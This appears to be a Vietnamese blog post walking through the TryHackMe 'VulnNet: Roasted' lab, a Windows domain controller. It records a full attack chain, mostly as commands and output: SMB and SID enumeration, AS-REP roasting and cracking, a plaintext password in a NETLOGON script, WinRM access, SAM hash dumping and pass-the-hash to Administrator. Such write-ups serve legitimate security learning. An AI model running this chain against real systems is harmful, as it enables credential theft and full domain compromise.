---
layout: post
author: "Neo"
title: "Tryhackme - VulnNet: Roasted"
date: "2022-04-13"
tags: [
    "tryhackme",
    "smb",
    "windows",
	"impacket",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-04-13-THM-VulnNet-Roasted.png)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted)
## Reconnaissance

Như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy mục tiêu.

```python
Open 10.10.15.106:88
Open 10.10.15.106:135
Open 10.10.15.106:139
Open 10.10.15.106:445
Open 10.10.15.106:389
Open 10.10.15.106:464
Open 10.10.15.106:593
Open 10.10.15.106:636
Open 10.10.15.106:3268
Open 10.10.15.106:3269
Open 10.10.15.106:49684
Open 10.10.15.106:49697
Open 10.10.15.106:49669
Open 10.10.15.106:49670
Open 10.10.15.106:49665
```

Quá nhiều port đang mở, nhưng vì trong intro cũng đã nói đây là máy Window, vậy nên tôi sẽ khai thác port window trước: 135, 139, 445, 389

Kiểm tra share file với *smbclient*

```python
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.15.106
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.15.106 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Có xuất hiện share file của anonymous nên tôi truy cập với user này

Sử dụng *impacket*

```python
┌──(kali㉿kali)-[~]
└─$ impacket-lookupsid anonymous@10.10.15.106
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.15.106
[*] StringBinding ncacn_np:10.10.15.106[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

Thực hiện lấy các user có trong domain này tôi được

```pyton
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

Tạo 1 file *user.txt* và nhét hết chúng vào đó

Thực hiện brute-force với các user phía trên

```python
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers -dc-ip 10.10.15.106 -usersfile user.txt -no-pass vulnnet-rst.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:06e72f956b790ca9f51e200ba6ba5533$85e557a35c7ce7cf1e9d648ca35799fa8e6a141a4aea843dd759a8cffae1aa642bb90eb031b5e0b68277413dcdbe4ca2c4bc55240aa9bda8401876df2a9e96991153ded0e68f46ef369f68587e2f486f4411c85730ae91b95d3cc8c351b54282d5bc52ba2268c3d529e70c83c6e16ffa85e72c596e5fadea45ea5260b8c10bcc96feee72536887d1626119e9bc96dbe8f3f9a0cf6fc3e30cd0a6b737745dd200718cf3c69314d467be57c47be6a37af19148b57c68af2544da5fd528485920f2894b2ee3594ba4c4b5f72e94bfb66bf32e3fee1f3a6918e021da7da1708607cca66dd386018d3e14968b9203179d5d06896669951ab2
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH setsmbcli
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Lấy đoạn hash này về và giải mã nó bằng *john*

```python
┌──(kali㉿kali)-[~]
└─$ sudo john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
```

Sử dụng user *t-skid* và pass ở trên để truy cập smbclient

```python
┌──(kali㉿kali)-[~]
└─$ smbclient -U vulnnet-rst.local/t-skid //10.10.24.168/NETLOGON                              
Password for [VULNNET-RST.LOCAL\t-skid]:
Try "help" to get a list of possible commands.
smb: \> DIR
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4554815 blocks available
smb: \> get ResetPassword.vbs /home/kali/ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as /home/kali/ResetPassword.vbs (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

Mở nó ra và tôi tìm thấy 1 user - pass mới

```python
┌──(kali㉿kali)-[~]
└─$ cat ResetPassword.vbs 
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName  
```

Sử dụng *evil-winrm* để khai thác window

```python
┌──(kali㉿kali)-[~]
└─$ sudo evil-winrm -i 10.10.24.168 -u a-whitehat -p "bNdKVkjv3RR9ht"
[sudo] password for kali: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> dir
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd \Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/5/2022   8:57 AM                a-whitehat
d-----        3/13/2021   3:20 PM                Administrator
d-----        3/13/2021   3:42 PM                enterprise-core-vn
d-r---        3/11/2021   7:36 AM                Public


*Evil-WinRM* PS C:\Users> cd enterprise-core-vn\Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt
```

## Privilege escalation

Tôi sẽ thử tìm dump của các user bằng *impacket-secretsdump*

```python
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.24.168
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
```

Vậy là tôi có hash của admin. Login thử với *evil-winrm*

```python
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.24.168 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop/
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt
```

*system.txt* chính là *root-flag*.